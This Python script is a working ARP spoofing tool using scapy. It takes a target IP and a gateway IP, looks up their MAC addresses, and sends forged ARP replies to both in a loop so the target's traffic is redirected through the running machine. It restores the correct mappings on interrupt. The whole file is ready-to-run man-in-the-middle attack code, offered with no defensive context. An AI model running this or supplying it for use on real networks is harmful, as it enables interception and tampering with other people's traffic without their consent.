#!/bin/python

import time
import argparse
import scapy.all as scapy


class ArpSpoofing:
    def __init__(self, target_ip, gateway_ip):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.target_mac = self.get_target_mac()
        self.gateway_mac = self.get_gateway_mac()
        self.main_loop()

    def main_loop(self):
        """
        send arp responses every 10 seconds
        """
        try:
            while True:
                self.redirect_target()
                self.redirect_gateway()
                time.sleep(2)
        except KeyboardInterrupt:
            self.restore_network()

    def restore_network(self):
        """
        restore the network to its default structure
        """
        # tell the gateway the correct location of the target by sending 5 corrrect arp packets
        frame1 = scapy.ARP(op='is-at', hwdst="ff:ff:ff:ff:ff:ff", pdst=self.gateway_ip, hwsrc=self.target_mac,
                           psrc=self.target_ip)
        for i in range(5):
            scapy.send(frame1)

        # tell the target the correct location of the gateway by sending 5 correct arp packets
        frame2 = scapy.ARP(op='is-at', hwdst="ff:ff:ff:ff:ff:ff", pdst=self.target_ip, hwsrc=self.gateway_mac,
                           psrc=self.gateway_ip)
        for i in range(5):
            scapy.send(frame2)

    def redirect_target(self):
        """
        tell the target that the gateway has the mac of the local nic
        """
        frame = scapy.ARP(op='is-at', psrc=self.gateway_ip, hwdst=self.target_mac, pdst=self.target_ip)
        scapy.send(frame)

    def redirect_gateway(self):
        """
        tell the gateway that the target has the mac of the local nic
        """
        frame = scapy.ARP(op='is-at', psrc=self.target_ip, hwdst=self.gateway_mac, pdst=self.gateway_ip)
        scapy.send(frame)

    def get_target_mac(self):
        """
        get the corresponding mac of the target ip
        """
        arp_packet = scapy.ARP(pdst=self.target_ip)
        answer = scapy.sr1(arp_packet)
        return answer.hwsrc

    def get_gateway_mac(self):
        """
        get the corresponding mac of the gateway ip
        """
        arp_packet = scapy.ARP(pdst=self.gateway_ip)
        answer = scapy.sr1(arp_packet)
        return answer.hwsrc


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', required=True, help='ip of the target')
    parser.add_argument('-g', '--gateway', required=True, help='ip of the gateway/server')
    arguments = vars(parser.parse_args())

    arp_spoofing = ArpSpoofing(arguments['target'], arguments['gateway'])
